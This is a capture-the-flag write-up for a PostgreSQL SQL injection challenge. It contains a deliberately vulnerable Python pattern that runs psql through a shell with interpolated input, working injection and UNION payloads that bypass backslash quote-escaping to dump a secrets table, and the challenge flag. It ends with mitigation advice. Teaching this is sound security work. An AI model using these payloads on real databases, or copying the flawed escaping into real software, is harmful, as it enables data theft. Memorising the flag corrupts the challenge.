# The Great Escape - Solution Writeup

**Difficulty:** Medium
**Category:** Web / SQL Injection
**Flag:** `Exploit3rs{th3_gr34t_n3xus_3sc4p3}`

---

## Overview

This challenge exploits a SQL injection vulnerability caused by improper quote escaping in a PostgreSQL application. The app uses backslash escaping (`'` -> `\'`) combined with `standard_conforming_strings=off`, which allows attackers to bypass the sanitization using the `\'` escape sequence.

## Vulnerability Analysis

### The Vulnerable Code Pattern

```python
def sanitize_input(user_input):
    # Flawed: escapes quotes with backslash
    return user_input.replace("'", "\\'")

psql_cmd = (
    f'psql -h {host} -U {user} -d {db} '
    f"-c \"SET standard_conforming_strings=off; SELECT * FROM employees WHERE department = '{sanitized}' ...\""
)
subprocess.run(psql_cmd, shell=True, ...)
```

### Why Standard Injection Fails

When a user inputs `' OR 1=1--`, the application transforms it to:
```
\' OR 1=1--
```

The quote is escaped, so the SQL string remains intact and no injection occurs.

### The Bypass: Backslash Escape Sequence

The key insight is that with `standard_conforming_strings=off`, backslash sequences are interpreted:
- `\\` = literal backslash character
- `\'` = literal quote character (inside string)

**Attack Input:** `\' OR 1=1--`

**After Sanitization:** `\\' OR 1=1--`
- The `\` in our input stays as `\`
- The `'` becomes `\'`
- Result: `\` + `\'` = `\\'`

**In SQL with standard_conforming_strings=off:**
```sql
WHERE department = '\\' OR 1=1--'
```
- `\\` = escaped backslash = literal `\`
- `'` = **ends the string**
- ` OR 1=1--` = SQL injection!

---

## Step-by-Step Solution

### Step 1: Reconnaissance

1. Visit the application at `http://localhost:8888`
2. Browse the Employee Directory - notice it's a search interface
3. Check the **footer**: `PostgreSQL 16.6 | psql CLI Backend`
4. Navigate to **Settings** page and find:
   - Connection Method: `psql CLI`
   - Query Mode: `Shell Subprocess`
   - Restricted Tables: `hr_secrets` (highlighted in red)
5. Navigate to **Reports** page and notice:
   - "HR Confidential Records" report is locked/restricted
   - Info message about "restricted data tables"

### Step 2: Test Standard SQL Injection

In the search box, try:
```
' OR 1=1--
```

**Result:** No results - the quote is being escaped. Standard SQLi doesn't work.

### Step 3: Research the Vulnerability

Clues gathered:
- PostgreSQL 16.6
- psql CLI backend (shell subprocess)
- Quote escaping is enabled
- `standard_conforming_strings` might be off

Research: PostgreSQL backslash escape + quote escaping bypass leads to the `\'` technique.

### Step 4: Test Escape Sequence Bypass

In the search box, enter:
```
\' OR 1=1--
```

**Result:** All 10 employees returned! The injection works.

### Step 5: Extract the Flag

Now that we know injection works and the table is `hr_secrets`, use UNION injection:

```
\' UNION SELECT 1,key,value,classification,key FROM hr_secrets--
```

**Result:** The hr_secrets table contents are displayed, including:

| Employee | Department | Position | Email |
|----------|------------|----------|-------|
| admin_flag | Exploit3rs{th3_gr34t_n3xus_3sc4p3} | TOP SECRET | admin_flag |

---

## Working Payloads

### Confirm Injection
```
\' OR 1=1--
```

### Extract Flag
```
\' UNION SELECT 1,key,value,classification,key FROM hr_secrets--
```

### Alternative - Get All Secrets
```
\' UNION SELECT id,key,value,classification,key FROM hr_secrets--
```

---

## Flag

```
Exploit3rs{th3_gr34t_n3xus_3sc4p3}
```

---

## Technical Deep Dive

### Why `\'` Becomes `\\'`

1. User input: `\' OR 1=1--`
2. Sanitization replaces `'` with `\'`:
   - Input has: `\` then `'` then ` OR 1=1--`
   - The `'` becomes `\'`
   - Result: `\` + `\'` + ` OR 1=1--` = `\\' OR 1=1--`

### Why `\\'` Breaks the String

With `standard_conforming_strings=off`:
- `\\` is an escape sequence for a literal backslash
- The next `'` is NOT escaped, so it terminates the string
- Everything after is executed as SQL

### The Final Query

```sql
SELECT id, name, department, position, email
FROM employees
WHERE department = '\\' OR 1=1--'
OR name = '\\' OR 1=1--'
ORDER BY name
```

Parses as:
```sql
SELECT ... WHERE department = '\' OR 1=1
```

---

## Mitigation

1. **Use parameterized queries** - Never concatenate user input into SQL
2. **Use proper database drivers** - psycopg2 with parameterized queries
3. **Don't shell out to psql** - Use native database connections
4. **Keep standard_conforming_strings=on** - Modern PostgreSQL default
5. **Use quote doubling, not backslash escaping** - `''` instead of `\'`

---

## References

- PostgreSQL String Constants: https://www.postgresql.org/docs/current/sql-syntax-lexical.html
- standard_conforming_strings: https://www.postgresql.org/docs/current/runtime-config-compatible.html
